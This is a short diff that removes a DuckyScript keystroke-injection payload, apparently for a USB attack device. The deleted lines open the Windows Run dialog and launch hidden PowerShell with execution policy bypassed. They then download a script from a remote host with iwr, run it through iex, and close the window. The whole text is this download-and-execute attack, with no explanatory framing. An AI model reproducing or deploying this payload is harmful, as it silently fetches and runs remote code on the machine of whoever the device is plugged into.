@@ -1,7 +1,0 @@
-GUI r
-DELAY 500
-STRINGLN powershell -Ep Bypass -W H
-DELAY 3000
-STRINGLN iwr site.com/file.ps1 | iex
-DELAY 500
-CTRL w
